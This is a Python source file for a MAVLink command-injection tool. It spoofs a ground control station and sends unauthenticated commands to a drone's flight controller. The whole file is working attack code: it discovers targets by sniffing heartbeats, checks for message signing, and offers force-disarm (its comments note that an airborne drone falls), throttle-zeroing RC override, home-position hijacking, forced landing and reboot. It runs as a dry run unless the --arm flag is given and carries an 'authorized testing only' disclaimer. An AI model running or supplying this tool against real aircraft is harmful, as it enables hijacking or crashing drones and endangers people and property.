#!/usr/bin/env python3
"""
MAVLink Command Injection Tool

Exploits the lack of message signing in MAVLink v1 and unsigned MAVLink v2
to inject arbitrary commands to a flight controller. This is a well-documented
protocol weakness — MAVLink has no authentication by default, so any device
on the same network/radio link can send valid commands.

The tool first sniffs traffic to discover the target system ID, then offers
a menu of attack commands. Nothing is sent until you explicitly choose.

Usage:
    # Dry run — show what would be sent (default, safe)
    python3 mavlink-injector.py --udp 192.168.1.1:14550

    # Arm the tool to actually transmit commands
    python3 mavlink-injector.py --udp 192.168.1.1:14550 --arm

    # Serial link (SiK radio UART)
    python3 mavlink-injector.py --serial /dev/ttyUSB0 --arm

    # Single command mode (non-interactive)
    python3 mavlink-injector.py --udp 192.168.1.1:14550 --arm --cmd disarm

    # Auto-discover system ID then inject
    python3 mavlink-injector.py --udp 192.168.1.1:14550 --arm --discover --cmd land

Dependencies:
    pip install pymavlink

For CTF research and authorized security testing only.
"""

import argparse
import sys
import time
import struct
from datetime import datetime

try:
    from pymavlink import mavutil
except ImportError:
    print("[!] pymavlink not installed. Run: pip install pymavlink", file=sys.stderr)
    sys.exit(1)


# Available attack commands
COMMANDS = {
    'disarm': {
        'desc': 'Disarm motors (CAUTION: drone falls if airborne)',
        'help': 'Sends MAV_CMD_COMPONENT_ARM_DISARM with param1=0 (disarm).',
    },
    'arm': {
        'desc': 'Arm motors',
        'help': 'Sends MAV_CMD_COMPONENT_ARM_DISARM with param1=1 (arm).',
    },
    'land': {
        'desc': 'Force landing at current position',
        'help': 'Sends MAV_CMD_NAV_LAND.',
    },
    'rtl': {
        'desc': 'Return to launch (RTH)',
        'help': 'Sends MAV_CMD_NAV_RETURN_TO_LAUNCH.',
    },
    'mode-land': {
        'desc': 'Set flight mode to LAND',
        'help': 'Sends SET_MODE with mode=LAND (ArduPilot mode 9).',
    },
    'mode-rtl': {
        'desc': 'Set flight mode to RTL',
        'help': 'Sends SET_MODE with mode=RTL (ArduPilot mode 6).',
    },
    'mode-loiter': {
        'desc': 'Set flight mode to LOITER (hold position)',
        'help': 'Sends SET_MODE with mode=LOITER (ArduPilot mode 5).',
    },
    'rc-override': {
        'desc': 'Override RC channels (take manual control)',
        'help': 'Sends RC_CHANNELS_OVERRIDE — sets throttle to 0.',
    },
    'set-home': {
        'desc': 'Change home position (redirects RTH)',
        'help': 'Sends MAV_CMD_DO_SET_HOME to a specified lat/lon/alt.',
    },
    'reboot': {
        'desc': 'Reboot flight controller',
        'help': 'Sends MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN.',
    },
}


class MAVLinkInjector:
    """MAVLink command injection via unsigned protocol."""

    def __init__(self, connection_string, baud=57600, armed=False):
        self.conn_str = connection_string
        self.baud = baud
        self.armed = armed
        self.conn = None
        self.target_sysid = None
        self.target_compid = 1  # MAV_COMP_ID_AUTOPILOT1

    def connect(self):
        """Establish MAVLink connection."""
        try:
            self.conn = mavutil.mavlink_connection(
                self.conn_str,
                baud=self.baud,
                source_system=255,      # Spoof as GCS
                source_component=190,   # MAV_COMP_ID_MISSIONPLANNER
                dialect="common",
            )
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}", file=sys.stderr)
            return False

    def discover_target(self, timeout=10):
        """Sniff for a HEARTBEAT to discover the target system ID."""
        print(f"[*] Discovering target system ID (waiting up to {timeout}s)...", file=sys.stderr)
        deadline = time.time() + timeout

        while time.time() < deadline:
            msg = self.conn.recv_match(type='HEARTBEAT', blocking=True, timeout=1.0)
            if msg is None:
                continue

            sysid = msg.get_srcSystem()
            # Skip GCS heartbeats (type 6) — we want the vehicle
            if msg.type == 6:
                print(f"  [.] Skipping GCS (sysid={sysid})", file=sys.stderr)
                continue

            self.target_sysid = sysid
            self.target_compid = msg.get_srcComponent()

            from mavlink_recon import VEHICLE_TYPES, AUTOPILOT_TYPES
            vtype = VEHICLE_TYPES.get(msg.type, f"Unknown({msg.type})")
            ap = AUTOPILOT_TYPES.get(msg.autopilot, f"Unknown({msg.autopilot})")
            armed = "ARMED" if msg.base_mode & 128 else "DISARMED"

            print(f"  [+] Found target: sysid={sysid} compid={self.target_compid}", file=sys.stderr)
            print(f"      Vehicle: {vtype} | Autopilot: {ap} | Status: {armed}", file=sys.stderr)
            return True

        print(f"  [!] No vehicle heartbeat received in {timeout}s", file=sys.stderr)
        return False

    def check_signing(self, timeout=5):
        """Check if the target uses message signing."""
        print(f"[*] Checking for message signing...", file=sys.stderr)
        deadline = time.time() + timeout
        signed = 0
        unsigned = 0

        while time.time() < deadline:
            msg = self.conn.recv_match(blocking=True, timeout=0.5)
            if msg is None:
                continue
            if msg.get_srcSystem() != self.target_sysid:
                continue
            if msg.get_type() == 'BAD_DATA':
                continue

            if hasattr(msg, '_header') and msg._header.incompat_flags is not None:
                if msg._header.incompat_flags & 0x01:
                    signed += 1
                else:
                    unsigned += 1

        if signed > 0:
            print(f"  [!] WARNING: Target uses message signing ({signed} signed msgs).", file=sys.stderr)
            print(f"      Injected commands will likely be REJECTED.", file=sys.stderr)
            return True
        else:
            print(f"  [+] No signing detected ({unsigned} unsigned msgs). Injection viable.", file=sys.stderr)
            return False

    def _send_command_long(self, command, p1=0, p2=0, p3=0, p4=0, p5=0, p6=0, p7=0):
        """Send a COMMAND_LONG message."""
        if not self.armed:
            print(f"  [DRY RUN] Would send COMMAND_LONG #{command} to sysid={self.target_sysid}", file=sys.stderr)
            print(f"            params: {p1}, {p2}, {p3}, {p4}, {p5}, {p6}, {p7}", file=sys.stderr)
            return

        self.conn.mav.command_long_send(
            self.target_sysid,
            self.target_compid,
            command,
            0,  # confirmation
            p1, p2, p3, p4, p5, p6, p7
        )
        print(f"  [TX] Sent COMMAND_LONG #{command} → sysid={self.target_sysid}", file=sys.stderr)

        # Wait for ACK
        ack = self.conn.recv_match(type='COMMAND_ACK', blocking=True, timeout=3.0)
        if ack and ack.command == command:
            result_names = {
                0: "ACCEPTED", 1: "TEMPORARILY_REJECTED", 2: "DENIED",
                3: "UNSUPPORTED", 4: "FAILED", 5: "IN_PROGRESS",
            }
            result = result_names.get(ack.result, f"UNKNOWN({ack.result})")
            print(f"  [RX] ACK: {result}", file=sys.stderr)
        else:
            print(f"  [RX] No ACK received (timeout or different command)", file=sys.stderr)

    def cmd_disarm(self):
        """Disarm motors."""
        print("[*] Injecting DISARM command...", file=sys.stderr)
        # MAV_CMD_COMPONENT_ARM_DISARM = 400
        # param1: 0=disarm, 1=arm
        # param2: 21196=force (bypasses pre-arm checks)
        self._send_command_long(400, p1=0, p2=21196)

    def cmd_arm(self):
        """Arm motors."""
        print("[*] Injecting ARM command...", file=sys.stderr)
        self._send_command_long(400, p1=1, p2=21196)

    def cmd_land(self):
        """Force land at current position."""
        print("[*] Injecting NAV_LAND command...", file=sys.stderr)
        # MAV_CMD_NAV_LAND = 21
        self._send_command_long(21)

    def cmd_rtl(self):
        """Return to launch."""
        print("[*] Injecting NAV_RETURN_TO_LAUNCH command...", file=sys.stderr)
        # MAV_CMD_NAV_RETURN_TO_LAUNCH = 20
        self._send_command_long(20)

    def cmd_mode_land(self):
        """Set mode to LAND."""
        print("[*] Setting flight mode to LAND...", file=sys.stderr)
        if not self.armed:
            print(f"  [DRY RUN] Would send SET_MODE LAND to sysid={self.target_sysid}", file=sys.stderr)
            return
        # ArduPilot LAND mode = 9, with MAV_MODE_FLAG_CUSTOM_MODE_ENABLED
        self.conn.mav.set_mode_send(
            self.target_sysid,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            9  # LAND
        )
        print(f"  [TX] SET_MODE LAND → sysid={self.target_sysid}", file=sys.stderr)

    def cmd_mode_rtl(self):
        """Set mode to RTL."""
        print("[*] Setting flight mode to RTL...", file=sys.stderr)
        if not self.armed:
            print(f"  [DRY RUN] Would send SET_MODE RTL to sysid={self.target_sysid}", file=sys.stderr)
            return
        self.conn.mav.set_mode_send(
            self.target_sysid,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            6  # RTL
        )
        print(f"  [TX] SET_MODE RTL → sysid={self.target_sysid}", file=sys.stderr)

    def cmd_mode_loiter(self):
        """Set mode to LOITER."""
        print("[*] Setting flight mode to LOITER...", file=sys.stderr)
        if not self.armed:
            print(f"  [DRY RUN] Would send SET_MODE LOITER to sysid={self.target_sysid}", file=sys.stderr)
            return
        self.conn.mav.set_mode_send(
            self.target_sysid,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            5  # LOITER
        )
        print(f"  [TX] SET_MODE LOITER → sysid={self.target_sysid}", file=sys.stderr)

    def cmd_rc_override(self):
        """Override RC channels — zero throttle."""
        print("[*] Injecting RC_CHANNELS_OVERRIDE (throttle=0)...", file=sys.stderr)
        if not self.armed:
            print(f"  [DRY RUN] Would send RC_CHANNELS_OVERRIDE to sysid={self.target_sysid}", file=sys.stderr)
            return

        # Send several times — RC override needs to be maintained
        for i in range(10):
            self.conn.mav.rc_channels_override_send(
                self.target_sysid,
                self.target_compid,
                1500, 1500, 1000, 1500,  # ch1-4: roll=center, pitch=center, throttle=min, yaw=center
                0, 0, 0, 0,             # ch5-8: release (0 = no override)
            )
            time.sleep(0.05)
        print(f"  [TX] Sent 10x RC_CHANNELS_OVERRIDE → sysid={self.target_sysid}", file=sys.stderr)

    def cmd_set_home(self, lat=0.0, lon=0.0, alt=0.0):
        """Change home position."""
        print(f"[*] Setting home position to ({lat}, {lon}, {alt}m)...", file=sys.stderr)
        # MAV_CMD_DO_SET_HOME = 179
        # param1: 0=specified position, 1=current position
        # param5: lat, param6: lon, param7: alt
        self._send_command_long(179, p1=0, p5=lat, p6=lon, p7=alt)

    def cmd_reboot(self):
        """Reboot flight controller."""
        print("[*] Injecting REBOOT command...", file=sys.stderr)
        # MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN = 246
        # param1: 1=reboot autopilot
        self._send_command_long(246, p1=1)

    def run_interactive(self):
        """Interactive command menu."""
        dispatch = {
            'disarm':      self.cmd_disarm,
            'arm':         self.cmd_arm,
            'land':        self.cmd_land,
            'rtl':         self.cmd_rtl,
            'mode-land':   self.cmd_mode_land,
            'mode-rtl':    self.cmd_mode_rtl,
            'mode-loiter': self.cmd_mode_loiter,
            'rc-override': self.cmd_rc_override,
            'reboot':      self.cmd_reboot,
        }

        mode = "ARMED" if self.armed else "DRY RUN"
        print(f"\n{'=' * 60}", file=sys.stderr)
        print(f"  MAVLink Injector — [{mode}]", file=sys.stderr)
        print(f"  Target: sysid={self.target_sysid} @ {self.conn_str}", file=sys.stderr)
        print(f"{'=' * 60}", file=sys.stderr)
        print(f"\n  Available commands:", file=sys.stderr)
        for name, info in COMMANDS.items():
            print(f"    {name:16s}  {info['desc']}", file=sys.stderr)
        print(f"    {'quit':16s}  Exit", file=sys.stderr)
        print(f"    {'help <cmd>':16s}  Show command details", file=sys.stderr)
        print(f"", file=sys.stderr)

        while True:
            try:
                choice = input(f"  [{mode}] > ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting.", file=sys.stderr)
                break

            if not choice:
                continue
            if choice == 'quit' or choice == 'exit':
                break

            if choice.startswith('help '):
                cmd_name = choice.split(None, 1)[1]
                if cmd_name in COMMANDS:
                    print(f"  {COMMANDS[cmd_name]['help']}", file=sys.stderr)
                else:
                    print(f"  Unknown command: {cmd_name}", file=sys.stderr)
                continue

            if choice == 'set-home':
                try:
                    lat = float(input("    Latitude:  "))
                    lon = float(input("    Longitude: "))
                    alt = float(input("    Altitude:  "))
                    self.cmd_set_home(lat, lon, alt)
                except ValueError:
                    print("  [!] Invalid coordinates.", file=sys.stderr)
                continue

            if choice in dispatch:
                dispatch[choice]()
            else:
                print(f"  Unknown command: {choice}", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="MAVLink Command Injection — exploit unsigned MAVLink",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
SAFETY: By default this tool runs in DRY RUN mode and sends nothing.
Pass --arm to enable actual transmission.

Examples:
  %(prog)s --udp 192.168.1.1:14550                  Dry run, interactive
  %(prog)s --udp 192.168.1.1:14550 --arm             Armed, interactive
  %(prog)s --udp 192.168.1.1:14550 --arm --cmd land  Armed, single command
  %(prog)s --serial /dev/ttyUSB0 --arm --discover    Serial, auto-discover
        """
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--udp", metavar="HOST:PORT", help="UDP target (e.g. 192.168.1.1:14550)")
    group.add_argument("--serial", metavar="DEVICE", help="Serial port (e.g. /dev/ttyUSB0)")
    parser.add_argument("--baud", type=int, default=57600, help="Serial baud rate (default: 57600)")
    parser.add_argument("--arm", action="store_true",
                        help="Actually send commands (default: dry run)")
    parser.add_argument("--target-sysid", type=int, default=None,
                        help="Target system ID (default: auto-discover from traffic)")
    parser.add_argument("--discover", action="store_true",
                        help="Auto-discover target by sniffing heartbeats")
    parser.add_argument("--cmd", choices=list(COMMANDS.keys()),
                        help="Single command to execute (non-interactive)")
    parser.add_argument("--set-home-lat", type=float, help="Latitude for set-home command")
    parser.add_argument("--set-home-lon", type=float, help="Longitude for set-home command")
    parser.add_argument("--set-home-alt", type=float, default=0, help="Altitude for set-home command")

    args = parser.parse_args()

    # Build connection string
    if args.serial:
        conn_str = args.serial
    else:
        conn_str = f"udpout:{args.udp}"

    injector = MAVLinkInjector(conn_str, baud=args.baud, armed=args.arm)

    if not args.arm:
        print("[*] DRY RUN mode — no commands will be sent. Use --arm to transmit.", file=sys.stderr)

    if not injector.connect():
        sys.exit(1)

    # Discover or set target
    if args.target_sysid:
        injector.target_sysid = args.target_sysid
        print(f"[*] Using specified target sysid={args.target_sysid}", file=sys.stderr)
    else:
        if not injector.discover_target():
            print("[!] No target found. Specify --target-sysid or ensure traffic is flowing.", file=sys.stderr)
            sys.exit(1)

    # Check signing
    injector.check_signing()

    # Single command or interactive
    if args.cmd:
        dispatch = {
            'disarm':      injector.cmd_disarm,
            'arm':         injector.cmd_arm,
            'land':        injector.cmd_land,
            'rtl':         injector.cmd_rtl,
            'mode-land':   injector.cmd_mode_land,
            'mode-rtl':    injector.cmd_mode_rtl,
            'mode-loiter': injector.cmd_mode_loiter,
            'rc-override': injector.cmd_rc_override,
            'reboot':      injector.cmd_reboot,
        }
        if args.cmd == 'set-home':
            if args.set_home_lat is None or args.set_home_lon is None:
                print("[!] --set-home-lat and --set-home-lon required for set-home command", file=sys.stderr)
                sys.exit(1)
            injector.cmd_set_home(args.set_home_lat, args.set_home_lon, args.set_home_alt)
        elif args.cmd in dispatch:
            dispatch[args.cmd]()
    else:
        injector.run_interactive()


if __name__ == "__main__":
    main()
